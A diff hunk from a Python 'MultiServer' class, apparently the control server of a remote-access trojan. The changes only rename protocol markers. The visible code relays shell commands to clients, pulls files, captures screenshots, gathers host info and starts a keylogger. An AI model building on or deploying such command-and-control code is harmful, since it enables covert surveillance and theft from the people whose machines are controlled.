@@ -218,7 +218,7 @@ class MultiServer(object):
         KEY = self.get_key(conn)
 
         length = int(KEY.decrypt(conn.recv(2048)).decode())
-        conn.send(b'<RECEIVED>')
+        conn.send(b'RECEIVED')
         received = KEY.decrypt(self.recvall(conn, length))
         if _print:
             print(received.decode())
@@ -246,9 +246,9 @@ class MultiServer(object):
 
                 def recv_data(conn):
                     buffer = int(conn.recv(4096).decode())
-                    conn.send(b'<RECEIVED>')
+                    conn.send(b'RECEIVED')
                     data = self.recvall(conn, buffer)
-                    conn.send(b'<RECEIVED>')
+                    conn.send(b'RECEIVED')
                     return data
 
                 Hashed_Key = recv_data(conn)
@@ -338,27 +338,27 @@ class MultiServer(object):
     def send_file(self, conn, file_to_transfer, save_as) -> None:
         """ Send file from Server to Client """
         # returns None
-        self.send(conn, json_dumps(['SEND FILE', save_as]))
+        self.send(conn, json_dumps(['SEND_FILE', save_as]))
         self.receive(conn, _print=False)
         for line in read_file(file_to_transfer):
             self.send(conn, line)
             self.receive(conn, _print=False)
 
-        self.send(conn, b'<FILE TRANSFER DONE>')
+        self.send(conn, b'FILE_TRANSFER_DONE')
         self.receive(conn)
 
     def receive_file(self, conn, file_to_transfer, save_as) -> None:
         """ Transfer file from Client to Server """
 
-        self.send(conn, json_dumps(['RECEIVE FILE', file_to_transfer]))
+        self.send(conn, json_dumps(['RECEIVE_FILE', file_to_transfer]))
         with open(save_as, 'wb') as f:
             while 1:
                 data = self.receive(conn, _print=False)
-                if data == b'<FILE TRANSFER DONE>':
-                    self.send(conn, b'<RECEIVED>')
+                if data == b'FILE_TRANSFER_DONE':
+                    self.send(conn, b'RECEIVED')
                     break
                 f.write(data)
-                self.send(conn, b'<RECEIVED>')
+                self.send(conn, b'RECEIVED')
         self.receive(conn)
 
     def _get_log(self, conn) -> str:
@@ -371,8 +371,8 @@ class MultiServer(object):
         # returns True/False, None/error
         self.send(conn, json_dumps(['SCREENSHOT']))
         data = self.receive(conn, _print=False).decode()
-        if data == '<ERROR>':
-            self.send(conn, b'<RECEIVING>')
+        if data == 'ERROR':
+            self.send(conn, b'RECEIVING')
             return False, self.receive(conn, _print=False)
         self.receive_file(conn, data, save_as)
         return True, save_as
@@ -414,7 +414,7 @@ class MultiServer(object):
         if command[:2].lower().strip() == 'cd' or command[:5].lower().strip() == 'chdir':
             self.send(conn, json_dumps(['SHELL', command]))
             cwd = json.loads(self.receive(conn, _print=False).decode())
-            if cwd[0] == '<ERROR>':
+            if cwd[0] == 'ERROR':
                 if _print:
                     print(cwd[1])
                 cwd = self.get_cwd(conn)
@@ -431,7 +431,7 @@ class MultiServer(object):
         result = []
         while 1:
             output = self.receive(conn, _print=False)
-            if output == b'<DONE>':
+            if output == b'DONE':
                 break
             result.append(output)
             if _print:
@@ -439,20 +439,20 @@ class MultiServer(object):
                     print(output.decode())
                 except UnicodeDecodeError:
                     print(output)
-            self.send(conn, json_dumps(['<LISTENING>']))
+            self.send(conn, json_dumps(['LISTENING']))
         cwd = self.get_cwd(conn)
         return result, cwd
 
     def get_platform(self, conn) -> str:
         """ Get Client Platform """
         # platform.system()
-        self.send(conn, json_dumps(['<PLATFORM>']))
+        self.send(conn, json_dumps(['PLATFORM']))
         return self.receive(conn, _print=False).decode()
 
     def get_cwd(self, conn) -> str:
         """ Get Client cwd """
         # returns cwd
-        self.send(conn, json_dumps(['<GETCWD>']))
+        self.send(conn, json_dumps(['GETCWD']))
         return self.receive(conn, _print=False).decode()
 
     def start_keylogger(self, conn) -> bool:
@@ -512,7 +512,7 @@ class MultiServer(object):
         #     getpass.getlogin()
         # ]
 
-        self.send(conn, json_dumps(['<INFO>']))
+        self.send(conn, json_dumps(['_INFO']))
         return json_loads(self.receive(conn, _print=False))
 
     def download(self, conn, url, file_name) -> (bool, str):
